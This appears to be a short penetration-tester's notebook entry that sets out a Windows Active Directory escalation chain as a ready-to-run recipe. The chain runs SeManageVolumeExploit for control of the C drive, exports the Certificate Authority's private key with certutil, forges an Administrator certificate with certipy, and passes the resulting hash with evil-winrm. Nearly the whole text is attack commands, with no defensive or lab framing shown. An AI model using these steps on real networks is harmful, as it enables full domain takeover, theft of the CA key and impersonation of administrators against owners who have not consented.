Get the SeManageVolumeExploit from Github on attacking machine:
```
git clone https://github.com/CsEnox/SeManageVolumeExploit
```

Upload the executable file from that repository using winrm:
```
upload SeManageVolumeExploit.exe
.\SeManageVolumeExploit.exe
```


Now that the exploiting user has full control over the C drive, use certutil to export the pfx of the Certificate Authority to then be used to forge an Administrator certificate

On victim machine:
```
certutil -exportPFX my "Certificate-LTD-CA" C:\Users\Public\ca.pfx
```
```
download C:\Users\Public\ca.pfx
```

On attacker machine:
```
certipy-ad forge -ca-pfx ca.pfx -upn 'administrator@<domain>' -subject 'CN=Administrator,CN=Users,DC=<domain>,DC=<top level domain>' -out administrator.pfx
```
```
sudo ntpdate <FQDN of domain controller>
```
```
certipy-ad auth -pfx administrator.pfx -dc-ip <ip of domain controller> -domain <domain name>
```

Authenticate to domain controller using the Administrator hash in [[evil-winrm]]
```
evil-winrm -i <FQDN> -u administrator -H "<LM hash>"
```